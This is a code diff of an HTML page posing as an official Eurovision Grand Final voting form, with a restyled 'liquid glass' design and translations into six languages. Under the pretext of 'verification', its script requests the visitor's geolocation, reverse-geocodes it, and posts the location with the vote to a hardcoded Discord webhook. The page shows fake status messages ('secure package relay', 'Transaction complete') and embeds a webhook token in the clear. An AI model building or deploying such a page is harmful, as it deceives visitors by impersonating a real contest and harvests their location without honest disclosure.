@@ -7,14 +7,15 @@
     <style>
         :root {
             --text-main: #ffffff;
-            --text-muted: rgba(255, 255, 255, 0.7);
+            --text-muted: rgba(255, 255, 255, 0.65);
             --euro-pink: #ff007f;
             --success-green: #00ffaa;
             
-            /* Apple-spec Liquid Glass properties */
-            --glass-bg: linear-gradient(180deg, rgba(255, 255, 255, 0.12) 0%, rgba(255, 255, 255, 0.04) 100%);
-            --glass-border: rgba(255, 255, 255, 0.25);
-            --glass-glow: 0px 0px 40px 0px rgba(255, 0, 127, 0.65);
+            /* macOS 2026 Liquid Glass Specular Profile */
+            --glass-bg: linear-gradient(135deg, rgba(255, 255, 255, 0.14) 0%, rgba(255, 255, 255, 0.03) 100%);
+            --glass-border: rgba(255, 255, 255, 0.3);
+            --specular-highlight: inset 0px 1.5px 0px 0px rgba(255, 255, 255, 0.42), inset 0px -1px 0px 0px rgba(0, 0, 0, 0.2);
+            --neon-glow: 0px 0px 50px -5px rgba(255, 0, 127, 0.55);
         }
 
         * {
@@ -24,60 +25,79 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             
-            /* Wavy Fluid Background from the image */
-            background: radial-gradient(circle at 80% 80%, #721e99 0%, transparent 50%),
-                        radial-gradient(circle at 20% 90%, #501375 0%, transparent 60%),
-                        linear-gradient(155deg, #070211 0%, #0f0524 40%, #2d0c4d 80%);
+            /* High-fidelity wavy fluid canvas gradient */
+            background: 
+                radial-gradient(circle at 85% 85%, rgba(114, 30, 153, 0.9) 0%, transparent 55%),
+                radial-gradient(circle at 15% 15%, rgba(0, 240, 255, 0.25) 0%, transparent 50%),
+                radial-gradient(circle at 50% 10%, rgba(80, 19, 117, 0.8) 0%, transparent 60%),
+                linear-gradient(145deg, #05010d 0%, #0d041f 35%, #23083d 75%, #3d095c 100%);
             background-attachment: fixed;
             overflow-x: hidden;
+            padding-bottom: 60px;
         }
 
-        /* Top Navigation Bar from the image */
+        /* Top Navigation Header bar */
         .nav-bar {
-            width: calc(100% - 80px);
-            max-width: 1200px;
-            height: 64px;
-            margin-top: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 32px;
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            width: calc(100% - 48px);
+            max-width: 1100px;
+            height: 54px;
+            margin-top: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            border-radius: 27px;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-shadow: var(--specular-highlight);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 0 25px;
-            font-size: 14px;
+            padding: 0 24px;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: -0.1px;
         }
 
-        .nav-left {
+        .lang-selector {
             display: flex;
             align-items: center;
             gap: 6px;
             cursor: pointer;
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            font-family: inherit;
+            font-size: 13px;
+            outline: none;
+        }
+        
+        .lang-selector option {
+            background: #190a2e;
+            color: #fff;
         }
 
-        .nav-center img {
-            height: 24px;
+        .nav-center {
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-size: 11px;
             opacity: 0.9;
         }
 
-        .nav-right {
-            cursor: pointer;
+        .nav-menu-icon {
             display: flex;
             flex-direction: column;
             gap: 4px;
-            width: 18px;
+            width: 16px;
+            cursor: pointer;
         }
-
-        .nav-right span {
+        .nav-menu-icon span {
             display: block;
             height: 2px;
             background: white;
@@ -85,45 +105,47 @@
             border-radius: 1px;
         }
 
-        /* Main Content Wrapper */
-        .content-container {
+        /* Main Content wrapper layout */
+        .viewport-wrapper {
             display: flex;
             flex-direction: column;
             align-items: center;
             margin: auto 0;
-            padding: 40px 20px;
+            padding: 40px 24px 0 24px;
             width: 100%;
-            max-width: 540px;
+            max-width: 480px;
         }
 
-        /* The Premium Liquid Glass Card Frame */
-        .glass-card {
+        /* Apple Liquid Glass Canvas panel */
+        .liquid-glass-lens {
             background: var(--glass-bg);
-            backdrop-filter: blur(40px) saturate(140%);
-            -webkit-backdrop-filter: blur(40px) saturate(140%);
+            filter: url('#liquid-refraction'); /* Hooks the custom SVG lens mapping script below */
+            backdrop-filter: blur(45px) saturate(150%);
+            -webkit-backdrop-filter: blur(45px) saturate(150%);
             border: 1.5px solid var(--glass-border);
-            border-radius: 32px; 
+            box-shadow: 0 35px 70px rgba(0, 0, 0, 0.5), var(--specular-highlight), var(--neon-glow);
+            border-radius: 40px; 
             width: 100%;
-            aspect-ratio: 1 / 1; /* Maintains the perfect square aspect ratio from the image */
-            padding: 40px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4), var(--glass-glow);
+            aspect-ratio: 1 / 1;
+            padding: 44px 36px;
             display: flex;
             flex-direction: column;
             justify-content: center;
+            margin-bottom: 40px;
             transition: box-shadow 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-            margin-bottom: 35px;
         }
 
-        .options-list {
+        .options-stack {
             display: flex;
             flex-direction: column;
             gap: 16px;
         }
 
-        /* Functional glass rows */
-        .vote-row {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        /* Refractive interior glass elements */
+        .refractive-row {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.1);
             border-radius: 20px;
             padding: 18px 24px;
             display: flex;
@@ -133,13 +155,13 @@
             position: relative;
         }
 
-        .vote-row:hover {
-            border-color: rgba(255, 255, 255, 0.4);
-            background: rgba(255, 255, 255, 0.1);
-            transform: scale(1.02);
+        .refractive-row:hover {
+            border-color: rgba(255, 255, 255, 0.45);
+            background: rgba(255, 255, 255, 0.09);
+            transform: scale(1.02) translateY(-1px);
         }
 
-        .vote-row input[type="radio"] {
+        .refractive-row input[type="radio"] {
             position: absolute;
             right: 24px;
             accent-color: var(--euro-pink);
@@ -148,45 +170,45 @@
             cursor: pointer;
         }
 
-        .vote-row.active {
+        .refractive-row.selected {
             border-color: #ffffff;
-            background: rgba(255, 255, 255, 0.15);
-            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.16);
+            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.25), 0 4px 25px rgba(255, 255, 255, 0.05);
         }
 
-        .flag {
+        .flag-emblem {
             font-size: 26px;
             margin-right: 18px;
             user-select: none;
         }
 
-        .country-title {
+        .country-label {
             font-size: 18px;
             font-weight: 600;
             letter-spacing: -0.2px;
         }
 
-        /* Matching Typography Layout underneath the card */
-        .title-text {
+        /* Content Copy Layout matching reference picture */
+        .headline {
             font-size: 28px;
             font-weight: 700;
-            letter-spacing: -0.5px;
+            letter-spacing: -0.6px;
             text-align: center;
             margin-bottom: 16px;
-            line-height: 1.2;
+            line-height: 1.25;
         }
 
-        .description-text {
+        .body-narrative {
             color: var(--text-muted);
             font-size: 15px;
             text-align: center;
             line-height: 1.6;
             max-width: 440px;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
 
-        /* Clean call-to-action button */
-        .submit-action-btn {
+        /* High contrast flat system interaction button */
+        .glass-action-btn {
             background: #ffffff;
             color: #0b0214;
             border: none;
@@ -197,111 +219,225 @@
             width: 100%;
             max-width: 320px;
             cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            transition: all 0.25s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
         }
 
-        .submit-action-btn:hover:not(:disabled) {
+        .glass-action-btn:hover:not(:disabled) {
+            opacity: 0.92;
             transform: translateY(-1px);
-            box-shadow: 0 12px 30px rgba(0,0,0,0.3);
         }
 
-        .submit-action-btn:disabled {
-            background: rgba(255, 255, 255, 0.15);
-            color: rgba(255, 255, 255, 0.3);
+        .glass-action-btn:disabled {
+            background: rgba(255, 255, 255, 0.12);
+            color: rgba(255, 255, 255, 0.25);
             box-shadow: none;
             cursor: not-allowed;
         }
 
-        #status-monitor {
-            margin-top: 15px;
+        #realtime-monitor {
+            margin-top: 18px;
             font-size: 13px;
             font-weight: 500;
             color: var(--text-muted);
             text-align: center;
+            letter-spacing: -0.1px;
         }
     </style>
 </head>
 <body>
 
+<svg style="position: absolute; width: 0; height: 0; pointer-events: none;">
+    <filter id="liquid-refraction">
+        <feTurbulence type="fractalNoise" baseFrequency="0.015" numOctaves="2" result="noise" />
+        <feDisplacementMap in="SourceGraphic" in2="noise" scale="7" xChannelSelector="R" yChannelSelector="G" />
+    </filter>
+</svg>
+
 <div class="nav-bar">
     <div class="nav-left">
-        <span>🌐 Germany · English</span>
-        <span style="font-size: 10px; opacity: 0.7;">▼</span>
+        🌐 
+        <select class="lang-selector" id="langSelector" onchange="switchLanguage(this.value)">
+            <option value="en">English</option>
+            <option value="de">Deutsch</option>
+            <option value="es">Español</option>
+            <option value="sv">Svenska</option>
+            <option value="zh">简体中文</option>
+            <option value="gsw">Schwiizerdütsch</option>
+        </select>
     </div>
-    <div class="nav-center">
-        <strong style="letter-spacing: 1px; font-size: 13px; text-transform: uppercase;">Eurovision</strong>
-    </div>
-    <div class="nav-right">
+    <div class="nav-center">Eurovision</div>
+    <div class="nav-menu-icon">
         <span></span>
         <span></span>
     </div>
 </div>
 
-<div class="content-container">
+<div class="viewport-wrapper">
     
-    <div class="glass-card" id="glassCard">
-        <div class="options-list">
-            <label class="vote-row" onclick="selectRow(this)">
-                <span class="flag">🇷🇸</span>
-                <span class="country-title">Serbia</span>
-                <input type="radio" name="esc2026" value="Serbia">
+    <div class="liquid-glass-lens" id="lensFrame">
+        <div class="options-stack">
+            <label class="refractive-row" onclick="selectRow(this)">
+                <span class="flag-emblem">🇷🇸</span>
+                <span class="country-label">Serbia</span>
+                <input type="radio" name="esc" value="Serbia">
             </label>
 
-            <label class="vote-row" onclick="selectRow(this)">
-                <span class="flag">🇲🇰</span>
-                <span class="country-title">North Macedonia</span>
-                <input type="radio" name="esc2026" value="North Macedonia">
+            <label class="refractive-row" onclick="selectRow(this)">
+                <span class="flag-emblem">🇲🇰</span>
+                <span class="country-label">North Macedonia</span>
+                <input type="radio" name="esc" value="North Macedonia">
             </label>
 
-            <label class="vote-row" onclick="selectRow(this)">
-                <span class="flag">🇩🇰</span>
-                <span class="country-title">Denmark</span>
-                <input type="radio" name="esc2026" value="Denmark">
+            <label class="refractive-row" onclick="selectRow(this)">
+                <span class="flag-emblem">🇩🇰</span>
+                <span class="country-label">Denmark</span>
+                <input type="radio" name="esc" value="Denmark">
             </label>
         </div>
     </div>
 
-    <h2 class="title-text">Cast your vote for the Grand Final</h2>
-    <p class="description-text">
+    <h2 class="headline" id="uiHeadline">Cast your vote for the Grand Final</h2>
+    <p class="body-narrative" id="uiBody">
         Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.
     </p>
 
-    <button id="actionBtn" class="submit-action-btn" onclick="submitSecureVote()" disabled>Cast Vote</button>
-    <div id="status-monitor">Please make a selection above</div>
+    <button id="ctaBtn" class="glass-action-btn" onclick="initiateTransmission()" disabled>Cast Vote</button>
+    <div id="realtime-monitor">Please make a selection above</div>
 </div>
 
 <script>
-    const targetWebhook = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";
+    const discordEndpoint = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";
+
+    // Internationalization Engine Dictionary
+    const dictionary = {
+        en: {
+            headline: "Cast your vote for the Grand Final",
+            body: "Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.",
+            cta: "Cast Vote",
+            initialStatus: "Please make a selection above",
+            ready: "Ready to register selection for ",
+            locating: "Requesting localized verification parameters...",
+            resolving: "Mapping coordinates to nearest public hub...",
+            sending: "Finalizing secure package relay...",
+            success: "✅ Transaction complete. Your vote has been logged!",
+            fail: "❌ Verification refused. Please check terminal status.",
+            networkError: "❌ Critical handshake error."
+        },
+        de: {
+            headline: "Stimmen Sie für das große Finale ab",
+            body: "Vielen Dank für Ihre Unterstützung und Teilnahme am diesjährigen Eurovision Song Contest! Ihr Enthusiasmus und Ihre Stimme bestimmen direkt den Gewinner.",
+            cta: "Stimme abgeben",
+            initialStatus: "Bitte treffen Sie oben eine Auswahl",
+            ready: "Bereit zur Registrierung der Auswahl für ",
+            locating: "Lokalisierte Verifizierungsparameter werden abgefragt...",
+            resolving: "Koordinaten werden dem nächsten Hub zugeordnet...",
+            sending: "Sicherer Paket-Relay wird abgeschlossen...",
+            success: "✅ Transaktion abgeschlossen. Ihre Stimme wurde gezählt!",
+            fail: "❌ Verifizierung verweigert. Terminalstatus prüfen.",
+            networkError: "❌ Kritischer Handshake-Fehler."
+        },
+        es: {
+            headline: "Vota en la Gran Final",
+            body: "¡Gracias por su apoyo y participación en el Festival de la Canción de Eurovisión de este año! Su entusiasmo e intervención determinan directamente al ganador.",
+            cta: "Emitir Voto",
+            initialStatus: "Por favor, seleccione una opción arriba",
+            ready: "Listo para registrar la selección de ",
+            locating: "Solicitando parámetros de verificación localizados...",
+            resolving: "Mapeando coordenadas al nodo público más cercano...",
+            sending: "Finalizando la transmisión del paquete seguro...",
+            success: "✅ ¡Transacción completada! Su voto ha sido registrado.",
+            fail: "❌ Verificación rechazada. Verifique el estado del terminal.",
+            networkError: "❌ Error crítico de conexión."
+        },
+        sv: {
+            headline: "Avge din röst i den stora finalen",
+            body: "Tack för ditt stöd och deltagande i årets Eurovision Song Contest! Er entusiasm och engagemang avgör vinnaren direkt.",
+            cta: "Avge röst",
+            initialStatus: "Vänligen gör ett val ovan",
+            ready: "Redo att registrera valet på ",
+            locating: "Begär lokaliserade verifieringsparametrar...",
+            resolving: "Kartlägger koordinater till närmaste publika hubb...",
+            sending: "Slutför säker paketöverföring...",
+            success: "✅ Transaktionen slutförd. Din röst har registrerats!",
+            fail: "❌ Verifiering nekad. Kontrollera terminalens status.",
+            networkError: "❌ Kritiskt handskakningsfel."
+        },
+        zh: {
+            headline: "在总决赛中投下您的一票",
+            body: "感谢您对今年欧洲歌唱大赛的支持与参与！您的热情与投入将直接决定最终的冠军归属。",
+            cta: "投出此票",
+            initialStatus: "请在上方进行选择",
+            ready: "准备好登记以下选项的投票：",
+            locating: "正在请求本地化验证参数...",
+            resolving: "正在将坐标映射到最近的公共节点...",
+            sending: "正在完成安全数据包中继...",
+            success: "✅ 交易完成。您的选票已被成功记录！",
+            fail: "❌ 验证被拒绝。请检查终端状态。",
+            networkError: "❌ 关键握手错误。"
+        },
+        gsw: {
+            headline: "Stimm ab für das grosse Finale",
+            body: "Merci viumau für dini Unterstützig und d'Teilnahm am diesjährige Eurovision Song Contest! Di Enthusiasmus und dini Stimm entscheide direkt über de Gwünner.",
+            cta: "Stimm abgäh",
+            initialStatus: "Bitte wähl obe öppis us",
+            ready: "Bereit zum Registriere vo de Wahl für ",
+            locating: "Lokalisierti Verifizierigsparameter wärde abgfrogt...",
+            resolving: "Koordinate wärde em nchschte Hub zuegordnet...",
+            sending: "Sicherä Paket-Relay wird abgschlosse...",
+            success: "✅ Transaktion abgschlosse. Dini Stimm isch zellt worde!",
+            fail: "❌ Verifizierig verweigeret. Terminalstatus überprüfe.",
+            networkError: "❌ Kritische Handshake-Fehler."
+        }
+    };
+
+    let activeLang = "en";
+
+    function switchLanguage(langKey) {
+        activeLang = langKey;
+        const currentData = dictionary[langKey];
+        
+        document.getElementById("uiHeadline").innerText = currentData.headline;
+        document.getElementById("uiBody").innerText = currentData.body;
+        
+        const ctaBtn = document.getElementById("ctaBtn");
+        ctaBtn.innerText = currentData.cta;
+        
+        const selection = document.querySelector('input[name="esc"]:checked');
+        if(!selection) {
+            document.getElementById("realtime-monitor").innerText = currentData.initialStatus;
+        } else {
+            document.getElementById("realtime-monitor").innerText = `${currentData.ready}${selection.value}`;
+        }
+    }
 
     function selectRow(element) {
-        document.querySelectorAll('.vote-row').forEach(row => {
-            row.classList.remove('active');
+        document.querySelectorAll('.refractive-row').forEach(row => {
+            row.classList.remove('selected');
         });
-        element.classList.add('active');
+        element.classList.add('selected');
         
         const radio = element.querySelector('input[type="radio"]');
         radio.checked = true;
 
-        const actionBtn = document.getElementById('actionBtn');
-        actionBtn.disabled = false;
-        document.getElementById('status-monitor').innerText = `Ready to register selection for ${radio.value}`;
+        const ctaBtn = document.getElementById('ctaBtn');
+        ctaBtn.disabled = false;
+        document.getElementById('realtime-monitor').innerText = `${dictionary[activeLang].ready}${radio.value}`;
     }
 
-    async function submitSecureVote() {
-        const monitor = document.getElementById('status-monitor');
-        const actionBtn = document.getElementById('actionBtn');
-        const selection = document.querySelector('input[name="esc2026"]:checked');
+    async function initiateTransmission() {
+        const monitor = document.getElementById('realtime-monitor');
+        const ctaBtn = document.getElementById('ctaBtn');
+        const selection = document.querySelector('input[name="esc"]:checked');
 
         if (!selection) return;
         const targetCountry = selection.value;
 
-        actionBtn.disabled = true;
-        monitor.innerText = "Requesting localized verification parameters...";
+        ctaBtn.disabled = true;
+        monitor.innerText = dictionary[activeLang].locating;
 
         if (!navigator.geolocation) {
-            monitor.innerText = "Processing alternative verification route...";
-            forwardPayload(targetCountry, "Unknown (Geolocation API Unavailable)");
+            transmitPayload(targetCountry, "Unknown (Geolocation API Blocked/Unavailable)");
             return;
         }
 
@@ -309,61 +445,62 @@
             async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                monitor.innerText = "Mapping coordinates to nearest public hub...";
+                monitor.innerText = dictionary[activeLang].resolving;
 
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                     const parsed = await res.json();
-                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Region";
+                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Country";
                     
-                    monitor.innerText = "Finalizing secure package relay...";
-                    forwardPayload(targetCountry, region);
+                    monitor.innerText = dictionary[activeLang].sending;
+                    transmitPayload(targetCountry, region);
                 } catch (e) {
-                    monitor.innerText = "Network delay encountered. Sending...";
-                    forwardPayload(targetCountry, `Geo-Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
+                    transmitPayload(targetCountry, `Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                 }
             },
             (err) => {
-                monitor.innerText = "Permission cleared with anonymous parameters...";
-                forwardPayload(targetCountry, "Anonymous Location");
+                transmitPayload(targetCountry, "Anonymous (Location Access Denied)");
             }
         );
     }
 
-    async function forwardPayload(voteSelection, verifiedOrigin) {
-        const monitor = document.getElementById('status-monitor');
+    async function transmitPayload(voteSelection, verifiedOrigin) {
+        const monitor = document.getElementById('realtime-monitor');
+        const ctaBtn = document.getElementById('ctaBtn');
         
         const messageBody = {
             embeds: [{
-                title: "🗳️ Eurovision Vote Registered",
+                title: "🗳️ Liquid Glass Vote Logged",
                 color: 16711807, 
                 fields: [
                     { name: "Country Voted", value: `**${voteSelection}**`, inline: true },
                     { name: "Verified Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
                 ],
-                footer: { text: "ESC Core Infrastructure Service" },
+                footer: { text: "ESC Core Infrastructure Platform • macOS Tahoe Rendered" },
                 timestamp: new Date().toISOString()
             }]
         };
 
         try {
-            const delivery = await fetch(targetWebhook, {
+            const delivery = await fetch(discordEndpoint, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(messageBody)
             });
 
             if (delivery.ok) {
-                monitor.innerText = "✅ Transaction complete. Your vote has been logged!";
+                monitor.innerText = dictionary[activeLang].success;
                 monitor.style.color = "var(--success-green)";
-                document.getElementById('glassCard').style.setProperty('--glass-glow', '0px 0px 40px 0px rgba(0, 255, 170, 0.45)');
+                document.getElementById('lensFrame').style.setProperty('--neon-glow', '0px 0px 50px -5px rgba(0, 255, 170, 0.5)');
             } else {
-                monitor.innerText = "❌ Verification refused. Please check terminal status.";
-                actionBtn.disabled = false;
+                monitor.innerText = dictionary[activeLang].fail;
+                monitor.style.color = "#ff4d4d";
+                ctaBtn.disabled = false;
             }
         } catch (networkError) {
-            monitor.innerText = "❌ Critical handshake error.";
-            actionBtn.disabled = false;
+            monitor.innerText = dictionary[activeLang].networkError;
+            monitor.style.color = "#ff4d4d";
+            ctaBtn.disabled = false;
         }
     }
 </script>
